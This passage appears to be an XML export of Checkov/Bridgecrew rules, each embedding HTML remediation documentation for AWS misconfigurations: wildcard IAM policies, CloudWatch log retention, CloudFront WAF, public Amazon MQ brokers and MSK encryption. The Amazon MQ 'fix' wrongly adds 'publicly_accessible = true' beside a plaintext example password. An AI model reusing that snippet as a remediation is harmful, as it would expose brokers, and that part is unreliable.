<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudtrail-defines-an-sns-topic' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-cloudtrail-defines-an-sns-topic</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudtrail-defines-an-sns-topic' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_62</key>
    <name>Ensure AWS IAM policy does not allow full administrative privileges</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-policy-allows-full-administrative-privileges"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-policy-allows-full-administrative-privileges"></div>AWS IAM policy allows full administrative privileges </div><a aria-label="Skip link to AWS IAM policy allows full administrative privileges " class="heading-anchor-icon fa fa-anchor" href="#aws-iam-policy-allows-full-administrative-privileges"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>IAM policies should grant a minimum set of permissions, adding more as required, rather than grant full administrative privileges. Providing full administrative privileges when not required exposes resources to potentially unwanted actions.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/iam/" target="_self">Amazon IAM console</a>.</li>
<li>In the navigation pane, click <strong>Policies </strong>and then search for the policy name found in the audit step.</li>
<li>Select the policy that needs to be deleted.</li>
<li>In the policy action menu, select first <strong>Detach</strong>.</li>
<li>Select all Users, Groups, Roles that have this policy attached.</li>
<li>Click <strong>Detach Policy</strong>.</li>
<li>In the policy action menu, select <strong>Detach</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all IAM users, groups, and roles that the specified managed policy is attached to:</li>
</ol>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws iam list-entities-for-policy --policy-arn &lt;policy_arn&gt;</code></p>
<ol start="2">
<li>Detach the policy from all IAM Users:</li>
</ol>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws iam detach-user-policy --user-name &lt;iam_user&gt; --policy-arn &lt;policy_arn&gt;</code></p>
<ol start="3">
<li>Detach the policy from all IAM Groups:</li>
</ol>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws iam detach-group-policy --group-name &lt;iam_group&gt; --policy-arn &lt;policy_arn&gt;</code></p>
<ol start="4">
<li>Detach the policy from all IAM Roles:</li>
</ol>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws iam detach-role-policy --role-name &lt;iam_role&gt; --policy-arn &lt;policy_arn&gt;</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>: aws_iam_policy</li>
<li><strong>Argument</strong>: policy - (Required) The policy document. This is a JSON formatted string. For more information about building AWS IAM policy documents with Terraform, see the AWS IAM Policy Document Guide </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_iam_policy" "policy" {
  name        = "test_policy"
  path        = "/"
  description = "My test policy"

  policy = &lt;&lt;EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Action": [
-        "*"
      ],
      "Effect": "Allow",
      "Resource": "*"
    }
  ]
}
EOF
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/iam_47' target='_blank'> https://docs.bridgecrew.io/docs/iam_47</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_47' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_63</key>
    <name>Ensure IAM policy documents do not allow * (asterisk) as a statement's action</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-policy-documents-allow--asterisk-as-a-statements-action"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-policy-documents-allow-asterisk-as-a-statements-action"></div>IAM policy documents allow * (asterisk) as a statement's action</div><a aria-label="Skip link to IAM policy documents allow * (asterisk) as a statement's action" class="heading-anchor-icon fa fa-anchor" href="#iam-policy-documents-allow--asterisk-as-a-statements-action"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>IAM policies should grant a minimum set of permissions, adding more as required, rather than grant full administrative privileges. Providing full administrative privileges when not required exposes resources to potentially unwanted actions.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/iam/" target="_self">Amazon IAM console</a>.</li>
<li>In the navigation pane, click <strong>Policies </strong>and then search for the policy name found in the audit step.</li>
<li>Select the policy that needs to be deleted.</li>
<li>In the policy action menu, select first <strong>Detach</strong>.</li>
<li>Select all Users, Groups, Roles that have this policy attached.</li>
<li>Click <strong>Detach Policy</strong>.</li>
<li>In the policy action menu, select <strong>Detach</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all IAM users, groups, and roles that the specified managed policy is attached to:</li>
</ol>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws iam list-entities-for-policy --policy-arn &lt;policy_arn&gt;</code></p>
<ol start="2">
<li>Detach the policy from all IAM Users:</li>
</ol>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws iam detach-user-policy --user-name &lt;iam_user&gt; --policy-arn &lt;policy_arn&gt;</code></p>
<ol start="3">
<li>Detach the policy from all IAM Groups:</li>
</ol>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws iam detach-group-policy --group-name &lt;iam_group&gt; --policy-arn &lt;policy_arn&gt;</code></p>
<ol start="4">
<li>Detach the policy from all IAM Roles:</li>
</ol>
<p><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws iam detach-role-policy --role-name &lt;iam_role&gt; --policy-arn &lt;policy_arn&gt;</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>: aws_iam_policy</li>
<li><strong>Argument</strong>: policy - (Required) The policy document. This is a JSON formatted string. For more information about building AWS IAM policy documents with Terraform, see the AWS IAM Policy Document Guide. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_iam_policy" "policy" {
  name        = "test_policy"
  path        = "/"
  description = "My test policy"

  policy = &lt;&lt;EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Action": [
-        "*"
      ],
      "Effect": "Allow",
      "Resource": "*"
    }
  ]
}
EOF
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/iam_48' target='_blank'> https://docs.bridgecrew.io/docs/iam_48</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_48' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_66</key>
    <name>Ensure CloudWatch log groups specify retention days</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudwatch-log-groups-do-not-specify-retention-days"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-watch-log-groups-do-not-specify-retention-days"></div>CloudWatch log groups do not specify retention days</div><a aria-label="Skip link to CloudWatch log groups do not specify retention days" class="heading-anchor-icon fa fa-anchor" href="#cloudwatch-log-groups-do-not-specify-retention-days"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling CloudWatch retention establishes how long log events are kept in AWS CloudWatch Logs. Retention settings are assigned to CloudWatch log groups and the retention period assigned to a log group is applied to their log streams. Any data older than the current retention setting is deleted automatically. You can change the log retention for each log group at any time.</p>
<p>Log data is stored in CloudWatch Logs indefinitely by default, l. This may incur high unexpected costs, especially when combined with other forms of logging. We recommend you configure how long to store log data for in a log group to balance cost with compliance retention requirements. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>Procedure:</p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/cloudwatch/" target="_self">Amazon CloudWatch console</a>.</li>
<li>In the navigation pane, choose<strong> Log Groups</strong>.</li>
<li>Find the log group to update.</li>
<li>In the <strong>Expire Events After</strong> column for that log group, choose the current retention setting, such as Never Expire.</li>
<li>In <strong>Edit Retention</strong>, for Retention, choose a log retention value, then click <strong>Ok</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Sets the retention of the specified log group. A retention policy allows you to configure the number of days for which to retain log events in the specified log group.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">put-retention-policy
--log-group-name &lt;value&gt;
--retention-in-days &lt;value&gt;
[--cli-input-json &lt;value&gt;]
[--generate-cli-skeleton &lt;value&gt;]
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_cloudwatch_log_group</li>
<li><strong>Argument:</strong> retention_in_days - (Optional) Specifies the number of days you want to retain log events in the specified log group. Possible values are: 1, 3, 5, 7, 14, 30, 60, 90, 120, 150, 180, 365, 400, 545, 731, 1827, 3653, and 0. If you select 0, the events in the log group are always retained and never expire. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudwatch_log_group" "example" {
  ...
  name = "example"
+ retention_in_days = 90
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_cloudwatch_log_group</li>
<li><strong>Argument:</strong> Properties.RetentionInDays - (Optional) Specifies the number of days you want to retain log events in the specified log group. Possible values are: 1, 3, 5, 7, 14, 30, 60, 90, 120, 150, 180, 365, 400, 545, 731, 1827, 3653, and 0. If you select 0, the events in the log group are always retained and never expire. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  logGroup:
    Type: AWS::Logs::LogGroup
    Properties: 
      ...
+     RetentionInDays: 90
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_13' target='_blank'> https://docs.bridgecrew.io/docs/logging_13</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_13' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_68</key>
    <name>Ensure CloudFront distribution has WAF enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudfront-distribution-does-not-have-waf-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-front-distribution-does-not-have-waf-enabled"></div>CloudFront distribution does not have WAF enabled</div><a aria-label="Skip link to CloudFront distribution does not have WAF enabled" class="heading-anchor-icon fa fa-anchor" href="#cloudfront-distribution-does-not-have-waf-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS WAF gives you control over how traffic reaches your applications by enabling you to create security rules. We recommend you create rules that block common attack patterns, such as SQL injection, cross-site scripting, and rules that filter out specific traffic patterns that you have defined.</p>
<p>With AWS Cloudfront &#8211; WAF integration enabled you will be able to block any malicious requests made to your Cloudfront Content Delivery Network based on the criteria defined in the WAF Web Access Control List (ACL) associated with the CDN distribution.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudfront-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-front-console"></div>CloudFront Console</div><a aria-label="Skip link to CloudFront Console" class="heading-anchor-icon fa fa-anchor" href="#cloudfront-console"></a></h2>
<ol>
<li>Log in to the CloudFront console at <a href="https://console.aws.amazon.com/cloudfront/" target="_self">https://console.aws.amazon.com/cloudfront/</a>.</li>
<li>Choose the ID for the distribution that you want to update.</li>
<li>On the General tab, click <strong>Edit</strong>.</li>
<li>On the Distribution Settings page, in the AWS WAF Web ACL list, choose the web ACL that you want to associate with this distribution.</li>
<li>If you want to disassociate the distribution from all web ACLs, choose None. If you want to associate the distribution with a different web ACL, choose the new web ACL.</li>
<li>Click <strong>Yes, Edit</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong>aws_cloudfront_distribution</li>
<li><strong>Arguments: </strong>web_acl_id (Optional) - If you're using AWS WAF to filter CloudFront requests, the Id of the AWS WAF web ACL that is associated with the distribution. The WAF Web ACL must exist in the WAF Global (CloudFront) region and the credentials configuring this argument must have waf:GetWebACL permissions assigned. If using WAFv2, provide the ARN of the web ACL. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudfront_distribution" "exapmle" {
  ...
  enabled             = true
  is_ipv6_enabled     = false
+ web_acl_id = aws_wafv2_web_acl.example.id
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong>AWS::CloudFront::Distribution</li>
<li><strong>Arguments: </strong> Properties.DistributionConfig.WebACLId</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: 'AWS::CloudFront::Distribution'
    Properties:
        ...
      DistributionConfig:
        ...
        WebACLId: arn:aws:wafv2:us-east-1:123456789012:global/webacl/ExampleWebACL/12345
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_27' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_27</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_27' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_69</key>
    <name>Ensure AWS MQ is not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-mq-is-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-mq-is-publicly-accessible"></div>AWS MQ is publicly accessible</div><a aria-label="Skip link to AWS MQ is publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#aws-mq-is-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Brokers created without public accessibility cannot be accessed from outside of your VPC. This greatly reduces your broker's susceptibility to DDoS attacks from the internet. Public Amazon MQ brokers can be accessed directly, outside of a VPC, allowing every EC2 on the Internet to reach your brokers through their public endpoints. This can increase the opportunity for malicious activity such as cross-site scripting and clickjacking attacks.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/amazon-mq/" target="_self">Amazon MQ console</a>.</li>
<li>In the <strong>Select deployment and storage</strong> page, in the <strong>Deployment mode and storage type</strong> section configure your MQ based on your specs.</li>
<li>In the <strong>Network and security </strong>section, configure your broker's connectivity and select the <strong>Public accessibility</strong> of your broker. Disabling public accessibility makes the broker accessible only within your VPC. </li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_mq_broker</li>
<li><strong>Argument:</strong> publicly_accessible - (Optional) Whether to enable connections from applications outside of the VPC that hosts the broker's subnets. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_mq_broker" "example" {
  broker_name = "example"
+ publicly_accessible = true
  configuration {
    id       = aws_mq_configuration.test.id
    revision = aws_mq_configuration.test.latest_revision
  }

  engine_type        = "ActiveMQ"
  engine_version     = "5.15.0"
  host_instance_type = "mq.t2.micro"
  security_groups    = [aws_security_group.test.id]

  user {
    username = "ExampleUser"
    password = "MindTheGap"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/public_11' target='_blank'> https://docs.bridgecrew.io/docs/public_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/public_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_81</key>
    <name>Ensure MSK cluster encryption at rest and in transit is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="msk-cluster-encryption-at-rest-and-in-transit-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-msk-cluster-encryption-at-rest-and-in-transit-is-not-enabled"></div>MSK cluster encryption at rest and in transit is not enabled</div><a aria-label="Skip link to MSK cluster encryption at rest and in transit is not enabled" class="heading-anchor-icon fa fa-anchor" href="#msk-cluster-encryption-at-rest-and-in-transit-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon MSK integrates with AWS Key Management Service (KMS) for server-side encryption. When you create an MSK cluster, you can specify the AWS KMS CMK for Amazon MSK to use to encrypt your data at rest. If you don't specify a CMK, Amazon MSK creates an AWS managed CMK for you and uses it on your behalf. </p>
<p>We recommend using encryption in transit and at rest to secure your managed Kafka queue.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Run the create-cluster command and use the encryption-info option to point to the file where you saved your configuration JSON. </p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws kafka create-cluster
--cluster-name "ExampleClusterName"
--broker-node-group-info file://brokernodegroupinfo.json
